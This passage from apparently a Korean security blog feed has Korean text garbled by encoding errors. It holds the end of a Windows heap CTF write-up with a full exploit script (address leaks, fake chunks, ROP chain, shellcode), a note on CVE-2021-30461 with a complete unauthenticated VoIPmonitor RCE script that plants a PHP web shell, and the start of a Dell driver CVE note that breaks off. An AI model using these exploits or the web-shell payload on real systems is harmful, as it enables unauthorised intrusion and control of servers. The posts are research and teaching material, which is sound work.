í™•ì¸í•˜ë©´ì„œ ì°¾ìœ¼ë©´ ì‰½ê²Œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php">ret_ins = imagebase+<span class="hljs-number">0x1b60</span>  ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span></code></pre><p>ì´ì œ í•´ì œí•œ <code>B chunk</code>ë¥¼ ì¬í• ë‹¹í•´ <code>B</code>ì— fake file structureë¥¼ ì“´ í›„ í•œë²ˆ ë” í• ë‹¹í•˜ë©´ ìš°ë¦¬ê°€ ë§Œë“  fake chunkê°€ í• ë‹¹ë˜ëŠ”ë°, <code>pwd+0x20</code> ì— íŒŒì¼ í¬ì¸í„°ê°€ ìˆì—ˆìœ¼ë‹ˆ header í¬ê¸° 16 bytesë¥¼ ì œì™¸í•œ 16ë§Œí¼ dummyë¥¼ ì±„ìš°ê³  <code>B chunk</code>ì˜ ì£¼ì†Œë¡œ íŒŒì¼ í¬ì¸í„°ë¥¼ overwrite í•©ë‹ˆë‹¤.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span></code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>ì´ì œ ë‚¨ì€ ê±´ rop chainì„ êµ¬ì„±í•´ì„œ <code>flag.txt</code>ì˜ íŒŒì¼ì˜ ë‚´ìš©ì„ ê°€ì ¸ì™€ ì¶œë ¥í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤! </p><ul><li><p><code>readfile</code>ì„ í˜¸ì¶œí•´ shellcode ì…ë ¥</p><ul><li><p><code>stdin</code>, <code>stdout</code>ì€  <code>peb+0x20</code>ì— ìœ„ì¹˜í•œ <code>ProcessParameter</code> êµ¬ì¡°ì²´ì—ì„œ leak</p><pre><code class="hljs python">process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre></li></ul></li><li><p><code>virtualprotect</code>ë¡œ shellcode ì£¼ì†Œì˜ ì‹¤í–‰ ê¶Œí•œ í—ˆìš© í›„ shellcodeë¡œ jump</p></li><li><p>shellcodeëŠ” <code>flag.txt</code>ë¥¼ ì½ì–´ stdoutìœ¼ë¡œ ì¶œë ¥</p></li></ul><p>í•„ìš”í•œ gadgetì€ <a href="http://ropshell.com/search">http://ropshell.com</a> ì— ìµìŠ¤ í™˜ê²½ì˜ <code>ntdll.dll</code>ì„ ì—…ë¡œë“œí•´ ì°¾ìœ¼ë©´ ë˜ë©°<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> ëŠ” <code>kernel32.dll</code>ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì•„ë˜ëŠ” ì „ì²´ <code>exploit.py</code> ì…ë‹ˆë‹¤. </p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">id,pw</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;User:&quot;</span>)p.sendline(id)p.recvuntil(<span class="hljs-string">&quot;Password:&quot;</span>)p.sendline(pw)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">key, size, data</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(size))p.recvuntil(<span class="hljs-string">&quot;Data&quot;</span>)p.send(data)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;3&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))context.arch = <span class="hljs-string">&quot;amd64&quot;</span><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;ddaa&quot;</span>,<span class="hljs-string">&quot;phdphd&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)<span class="hljs-comment">#leak heap base</span>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span><span class="hljs-comment">#leak next chunk key</span>p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]<span class="hljs-comment">#leak ntdll, imagebase, kernel32 base, stack</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>) <span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span><span class="hljs-comment"># leak from IAT</span>peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key,teb+<span class="hljs-number">0x10</span>)process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)ret_ins = imagebase+<span class="hljs-number">0x1b60</span> ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span>user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span><span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)login(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)virtualprotect = kernel32 + <span class="hljs-number">0x1afe0</span>readfile = kernel32 + <span class="hljs-number">0x22460</span>writefile = kernel32 + <span class="hljs-number">0x22550</span>createfile = kernel32 + <span class="hljs-number">0x220d0</span>pop_rdx_rcx_r8_to_r11 = ntdll + <span class="hljs-number">0x8d150</span>sc_address = imagebase + <span class="hljs-number">0x5000</span><span class="hljs-comment"># call readfile(stdin, sc_address, 0x100, sc_address+0x100)</span>rop_buf = p64(pop_rdx_rcx_r8_to_r11)rop_buf += p64(sc_address) + p64(stdin) + p64(<span class="hljs-number">0x100</span>) + p64(sc_address + <span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(readfile)<span class="hljs-comment"># call virtualprotect(sc_address, 0x1000, 0x40, sc_address+0x100-8)  </span>rop_buf += p64(pop_rdx_rcx_r8_to_r11) rop_buf += p64(<span class="hljs-number">0x1000</span>) + p64(sc_address) + p64(<span class="hljs-number">0x40</span>) + p64(sc_address + <span class="hljs-number">0x100</span> <span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(virtualprotect) + p64(sc_address)p.send(rop_buf.ljust(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)+p64(<span class="hljs-number">4</span>))shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><span class="hljs-string">jmp readflag</span><span class="hljs-string">flag:</span><span class="hljs-string">pop r11</span><span class="hljs-string">createfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x30], 0</span><span class="hljs-string">mov qword ptr [rsp + 0x28], 0x80</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 3</span><span class="hljs-string">xor r9, r9</span><span class="hljs-string">mov r8, 1</span><span class="hljs-string">mov rdx, 0x80000000</span><span class="hljs-string">mov rcx, r11</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;createfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">readfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, rax</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;readfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">writefile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, <span class="hljs-subst">&#123;stdout&#125;</span></span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;writefile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">loop:</span><span class="hljs-string">jmp loop</span><span class="hljs-string">readflag:</span><span class="hljs-string">call flag</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>shellcode = (asm(shellcode) + <span class="hljs-string">&quot;flag.txt\x00&quot;</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;\x90&quot;</span>)p.send(shellcode)p.interactive()</code></pre><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%207.png" alt="pwncoolsexy-part5/Untitled%207.png"></p><p>í—˜ë‚œí–ˆë‹¤â€¦ </p><h1 id="ë§ˆë¬´ë¦¬"><a href="#ë§ˆë¬´ë¦¬" class="headerlink" title="ë§ˆë¬´ë¦¬"></a>ë§ˆë¬´ë¦¬</h1><p>ë“œë””ì–´ í°ì¿¨ì„¹ì‹œ ì‹œë¦¬ì¦ˆ ë§ˆì§€ë§‰ ê¸€ê¹Œì§€ ëª¨ë‘ ëë‚¬ìŠµë‹ˆë‹¤ ì§ì§ã…‰ã…ã„± !  </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%201.png" alt="pwncoolsexy-part5/Untitled%201.png"></p><p>ì˜¤ëœë§Œì— Part 1 ê¸€ì„ ë³´ë©´ì„œ ì‹œë¦¬ì¦ˆ ëª©í‘œë¥¼ ë‹¤ì‹œ ë´¤ëŠ”ë°.. ì›ë˜ ê³„íšì— ë”± ë§ê²Œ Part 5ë¡œ ë§ˆë¬´ë¦¬ëë„¤ìš”. ì‚¬ì‹¤ ê±°ì˜ ë¬´ê³„íšì´ë‚˜ ë‹¤ë¦„ì—†ì—ˆëŠ”ë° ë‹¤í–‰ì´ë‹¤ íœ´ã…; </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%202.png" alt="pwncoolsexy-part5/Untitled%202.png"></p><p>ì•½ 3ê°œì›”ê°„ ì§„í–‰í•œ ì •ë“  ì‹œë¦¬ì¦ˆë¥¼ ë– ë‚˜ë³´ë‚´ë©°.. ì´ ê¸€ì´ ìœˆë„ìš°ë¥¼ ì²˜ìŒ ì‹œì‘í•˜ì‹œëŠ” ë¶„ë“¤ê»˜ ë§ì€ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ ì¢‹ê² ìŠµë‹ˆë‹¤. ì´ì œ ë‹¤ìŒì€ ë­˜ í• ì§€ ê³ ë¯¼í•´ì•¼ í•˜ëŠ”ë° ì•„ ë­í•˜ì§€ ã…ã„´ã…‡ã„¹ </p><p>ê·¸ëŸ¼ í•œë™ì•ˆì€ ê·¸ë™ì•ˆ ë´ ë‘ì—ˆë˜ ë²ˆì—­ê¸€ê³¼ í•˜ë£¨í•œì¤„ë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤! </p><ul><li>ëª¨ë“  ì‹œë¦¬ì¦ˆ ê¸€ì˜ ì˜¤ë¥˜ ë° ì˜¤íƒ€ ì§€ì ì€ ì–¸ì œë‚˜ í™˜ì˜ì…ë‹ˆë‹¤</li></ul><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%203.png" alt="pwncoolsexy-part5/Untitled%203.png"></p><blockquote><p>ì§„ì§œ ë!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-30461: VoIPmonitor RCE</title>
    <link href="/2021/05/08/fabu1ous/2021-05-08/"/>
    <url>/2021/05/08/fabu1ous/2021-05-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/">VoIPmonitor UnAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>VoIPmonitor &lt;= 24.60</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ì˜¤í”ˆì†ŒìŠ¤ network packet snifferì¸ VoIPmonitorì—ì„œ RCEì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ <code>SPOOLDIR</code> í˜¹ì€ <code>recheck</code> íŒŒë¼ë¯¸í„°ë¥¼ ì‚¬ìš©í•˜ëŠ” POST ìš”ì²­ì„ ì²˜ë¦¬í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. <code>SPOOLDIR</code> íŒŒë¼ë¯¸í„° ê°’ì€ UI ì¸í„°í˜ì´ìŠ¤ê°€ í˜¸ì¶œí•˜ëŠ” <code>config/configuration.php</code>ì— ì•„ë¬´ëŸ° í•„í„°ë‚˜ ê°€ê³µ ì—†ì´ ìˆëŠ” ê·¸ëŒ€ë¡œ ì‚½ì…ë©ë‹ˆë‹¤. ì´ëŠ” ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë¼ë„ ì›¹ ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ì„ì˜ì˜ PHP ì½”ë“œë¥¼ ì›ê²©ìœ¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•´  ì¤ë‹ˆë‹¤. </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv,exit<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> string<span class="hljs-keyword">try</span>:    <span class="hljs-keyword">import</span> requests<span class="hljs-keyword">except</span> ImportError:    print(<span class="hljs-string">&quot;pip3 install requests &quot;</span>)print(<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">###############################################</span><span class="hljs-string">#              VOIP Monitor RCE               #</span><span class="hljs-string">###############################################</span><span class="hljs-string">&quot;&quot;&quot;</span>)headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_target</span>(<span class="hljs-params">args</span>):</span>    hostname = args.host    path = args.path    <span class="hljs-keyword">if</span> path:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/index.php&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/index.php&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_tmp</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    n_data = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    set_totmp = requests.post(target, n_data, headers=headers)    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">&#123;set_totmp&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkVulnerability</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)    testcmd = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    response_text = <span class="hljs-string">b&quot;uid=&quot;</span>    testcmd_req = requests.post(target, testcmd, verify=<span class="hljs-literal">False</span>, headers=headers)    <span class="hljs-keyword">if</span> response_text <span class="hljs-keyword">in</span> testcmd_req.content:        print(<span class="hljs-string">&quot;[*] host is vulnerable&quot;</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[-] host is not vulnerable&quot;</span>)        exit()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadshell</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    hostname = args.host    path = args.path    shell_path = <span class="hljs-string">&quot;&quot;</span>    shellfilename = str ( <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )    target = get_target(args)    rce_payload = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&#x27;<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&#x27;,&#x27;&lt;?php echo system($_GET[\&quot;a\&quot;]);&#x27;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    rce_req = requests.post(target, headers=headers, data=rce_payload)    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">&#123;rce_req.status_code&#125;</span>&quot;</span>)    <span class="hljs-keyword">if</span> path:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    <span class="hljs-keyword">else</span>:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    shell_check = requests.get(shell_path, headers=headers, params=&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;id&#x27;</span>&#125;)    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">&#123;shell_check.text&#125;</span>&quot;</span>)    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">&#123;shell_path&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;VoIP Monitor all versions command execution&#x27;</span>)    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>,<span class="hljs-string">&#x27;--host&#x27;</span>,help=<span class="hljs-string">&#x27;Host&#x27;</span>, type=str)    parser.add_argument(<span class="hljs-string">&#x27;-b&#x27;</span>, <span class="hljs-string">&#x27;--path&#x27;</span>,help=<span class="hljs-string">&#x27;Path of the VoIP Monitor&#x27;</span>, type=str)    args = parser.parse_args()    set_tmp(args)    checkVulnerability(args)    set_tmp(args)    uploadshell(args)    set_tmp(args)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21551: ìˆ˜ì–µ ëŒ€ì˜ Dell PCì— ì˜í–¥ì„ ì£¼ëŠ” ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/05/07/l0ch/2021-05-07/"/>
    <url>/2021/05/07/l0ch/2021-05-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/">CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2009ë…„ë¶€í„° Dellì´ ì¶œì‹œí•œ ìˆ˜ì–µ ëŒ€ì˜ Windows ë””ë°”ì´ìŠ¤ì— ì˜í–¥ì„ ì£¼ëŠ” ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ë“œë¼ì´ë²„ <code>dbutil_2_3.sys</code>ëŠ” Dell BIOS ìœ í‹¸ë¦¬í‹°ë¥¼ í†µí•œ íŒì›¨ì–´ ì—…ë°ì´íŠ¸ì— ì‚¬ìš©ë˜ëŠ” ë“œë¼ì´ë²„ë¡œ 2009ë…„ë¶€í„° Dellì˜ ëŒ€ë¶€ë¶„ì˜ Windows ë””ë°”ì´ìŠ¤ì— í¬í•¨ë˜ì–´ ì •ê¸°ì ì¸ ì—…ë°ì´íŠ¸ì— ì‚¬ìš©ë©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ë“œë¼ì´ë²„ì—ëŠ” ë‹¤ì„¯ ê°œì˜ 